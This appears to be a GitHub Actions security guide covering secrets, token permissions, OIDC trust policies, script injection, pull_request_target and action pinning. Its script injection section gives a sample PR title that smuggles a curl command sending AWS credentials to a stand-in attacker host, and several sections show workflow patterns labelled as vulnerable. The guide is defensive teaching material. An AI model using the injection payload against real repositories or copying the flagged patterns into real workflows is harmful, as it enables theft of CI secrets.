# Security — secrets, permissions, OIDC and the ways this goes wrong

CI has your source code, your credentials, and the ability to deploy. It is a
high-value target. This page covers what actually gets exploited.

---

## Secrets vs variables

Both live in **Settings → Secrets and variables → Actions**.

| | Secrets | Variables |
|---|---|---|
| Read in logs | **masked** (`***`) | visible |
| Read back in UI | no, write-only | yes |
| Use for | tokens, keys, passwords | region, URL, feature flags |
| Reference | `${{ secrets.NAME }}` | `${{ vars.NAME }}` |

Three scopes, most specific wins: **repository** → **organisation** →
**environment**.

```yaml
steps:
  - env:
      API_KEY: ${{ secrets.API_KEY }}    # preferred: pass as env
    run: ./deploy.sh
```

### What masking does and doesn't do

GitHub replaces exact secret strings with `***` in logs. It does **not** catch:

- a **transformed** secret — base64'd, uppercased, JSON-escaped, URL-encoded
- a secret **split** across lines
- a secret written to an **artifact** you then download
- a secret sent to an external service by a malicious action

```yaml
- run: echo "${{ secrets.TOKEN }}" | base64      # LEAKS — masking misses it
```

Mask a derived value yourself:

```yaml
- run: |
    VALUE=$(compute-something)
    echo "::add-mask::$VALUE"
    echo "value=$VALUE" >> "$GITHUB_OUTPUT"
```

### Secrets are not available to forked PRs

For `pull_request` runs from a fork, `secrets.*` are **empty** and
`GITHUB_TOKEN` is read-only. This is deliberate — otherwise anyone could open
a PR that prints your secrets. Design workflows so forks still run tests
without needing secrets.

---

## `GITHUB_TOKEN` and `permissions:`

Every run gets an automatic `GITHUB_TOKEN`, scoped to that repo and expiring
when the job ends. Its default permissions depend on a repo setting, which may
be **read/write for everything** on older repos.

**Always declare permissions explicitly:**

```yaml
permissions:
  contents: read        # the safe baseline
```

Then add only what a specific job needs:

```yaml
jobs:
  release:
    permissions:
      contents: write     # create a release / push a tag
      packages: write     # push to GHCR
      id-token: write     # OIDC
```

Set the org/repo default to **read-only** in
Settings → Actions → General → Workflow permissions.

> **`GITHUB_TOKEN` cannot trigger other workflows.** A push made with it won't
> fire a `push` workflow — deliberate, to prevent infinite loops. If you need
> that, use a PAT or a GitHub App token, and understand you've re-enabled the
> loop risk.

---

## OIDC — stop storing cloud keys

The best practice for cloud deploys: **no stored credentials at all**. GitHub
mints a short-lived signed token; the cloud verifies it and returns temporary
credentials. Same mechanism as IRSA on EKS.

```
 GitHub Actions job
   │  requests an OIDC token (needs `id-token: write`)
   ▼
 GitHub OIDC provider  ──── signs a JWT with claims:
   │                          sub: repo:owner/repo:ref:refs/heads/main
   │                          aud: sts.amazonaws.com
   ▼
 AWS STS  ─── verifies the signature against GitHub's PUBLIC keys
   │      ─── checks the IAM role's trust policy: does `sub` match?
   ▼
 temporary AWS credentials (~1h)
```

```yaml
permissions:
  id-token: write        # REQUIRED — without it you get a confusing 403
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
      aws-region: ap-south-1
  - run: aws sts get-caller-identity
```

AWS-side trust policy — **the `sub` condition is the security boundary**:

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
```

> **The critical mistake:** `"sub": "repo:myorg/*"` or using `StringLike` with
> a wildcard. That lets **any branch, any PR, from any matching repo** assume
> your deploy role — including a PR branch an outsider controls. Pin the exact
> ref, or use `repo:myorg/myrepo:environment:production` and gate the
> environment with approvals.

Equivalents: Azure `azure/login` with `client-id`+`tenant-id`; GCP
`google-github-actions/auth` with Workload Identity Federation.

---

## Script injection — the #1 Actions vulnerability

Expressions are substituted into the script **as text, before it runs**.

```yaml
# VULNERABLE
- run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

A PR titled ``a"; curl -d "@$HOME/.aws/credentials" evil.com; #`` becomes a
command on your runner.

**Attacker-controlled fields include:** PR title and body, issue title and
body, comment body, commit message, branch name, author name, review body.

**The fix — environment variables, always:**

```yaml
# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: $TITLE"
```

The value becomes environment *data*; the shell never parses it as code.
Quote the variable (`"$TITLE"`) so word-splitting doesn't bite either.

---

## `pull_request_target` — handle with care

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Runs code from | the PR | the **base branch** |
| Secrets | not for forks | **yes** |

`pull_request_target` exists so a maintainer workflow (labelling, commenting)
can use secrets on fork PRs. The fatal pattern:

```yaml
# CATASTROPHIC — do not do this
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm install && npm run build                  # ...executed WITH secrets
```

`npm install` runs the attacker's `postinstall` script with full access to
your secrets. If you must check out PR code in `pull_request_target`, never
execute it — and prefer splitting into two workflows connected by
`workflow_run`.

---

## Pin third-party actions to a SHA

```yaml
uses: actions/checkout@v4                     # tag — CAN be moved by the owner
uses: actions/checkout@8ade135a41bc03ea155e...  # SHA — immutable
```

An action is code that runs in your job with your secrets. A compromised
maintainer account, or a moved tag, means arbitrary code execution. The
`tj-actions/changed-files` incident (March 2025) worked exactly this way:
tags were repointed at malicious code and thousands of repos leaked secrets
into their logs.

**Practical policy:**
- GitHub-owned (`actions/*`) — a major tag is generally acceptable
- everything else — **pin the full 40-char SHA**, with the version in a comment
- let Dependabot bump the SHAs for you:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Enforce it org-wide in Settings → Actions → General → *Allow specified actions*.

---

## Self-hosted runners

**Never use self-hosted runners on a public repository.** Anyone can open a PR
and run arbitrary code on your machine — and unlike GitHub-hosted runners, it
isn't destroyed afterwards, so they can persist.

If you must run them: ephemeral (`--ephemeral`, one job then exit), isolated
network, non-privileged user, no long-lived cloud credentials on the host, and
never on a machine that has access to production.

---

## Environments and approvals

```yaml
jobs:
  deploy:
    environment: production
```

In Settings → Environments you can require **reviewers**, restrict deployment
to specific branches/tags, add a wait timer, and scope secrets to that
environment only. This is how you get "a human must approve prod" — and how
you keep prod credentials out of every other workflow.

---

## Checklist

- [ ] `permissions:` declared explicitly; default set to read-only
- [ ] Repo default workflow permissions set to **read**
- [ ] Cloud auth via **OIDC**, not stored keys
- [ ] OIDC trust policy pins the exact `sub` — no wildcards
- [ ] Third-party actions pinned to **SHAs**; Dependabot enabled
- [ ] No `${{ }}` interpolation of untrusted text into `run:` — env vars instead
- [ ] `pull_request_target` avoided, or provably never executes PR code
- [ ] Secrets scoped to **environments** where possible
- [ ] Production deploys behind an environment with **required reviewers**
- [ ] No self-hosted runners on public repos
- [ ] `concurrency` on deploys so two don't race
- [ ] Secret scanning + push protection enabled on the repo
